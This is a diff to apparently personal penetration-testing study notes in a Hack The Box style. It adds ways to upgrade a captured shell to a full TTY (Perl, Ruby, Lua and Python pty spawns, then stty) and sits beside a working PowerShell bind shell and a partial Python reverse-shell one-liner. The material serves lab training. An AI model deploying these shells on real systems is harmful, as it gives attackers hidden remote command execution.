@@ -89,12 +89,45 @@ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.S
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 ```
 
-### Upgrading TTY
-To give us more terminal features (eg. a mouse, history, etc) we need to upgrade the TTY.
+## Upgrading TTY
+To give us more terminal features (eg. a prompt, mouse, history, etc) we need to upgrade the TTY. Often when creating a shell via an application user eg. `apache`, no shell interpreter language has been defined in the environment variables for that user. This means that we need to spawn our own TTY to gain these functionalities.
+
+### Interactive
+```shell
+/bin/sh -i
+/bin/bash -i
+```
+
+### Perl
+```shell
+perl -e 'exec "/bin/sh";'
+```
+```perl
+# Run inside a ruby script
+exec "/bin/sh";
+```
+### Ruby
+```shell
+ruby -e 'exec "/bin/sh"'
+```
+```ruby
+# Run inside a ruby script
+exec "/bin/sh"
+```
+
+### Lua
+```lua
+os.execute('/bin/sh')
+```
+
 There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
 
 ```shell
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+```shell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
@@ -111,7 +144,7 @@ www-data@remotehost$
 
 Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
 
-We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
+We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximise the windows or use any size we want, and then input the following commands to get our variables:
 
 ```shell
 alipali737@htb[/htb]$ echo $TERM
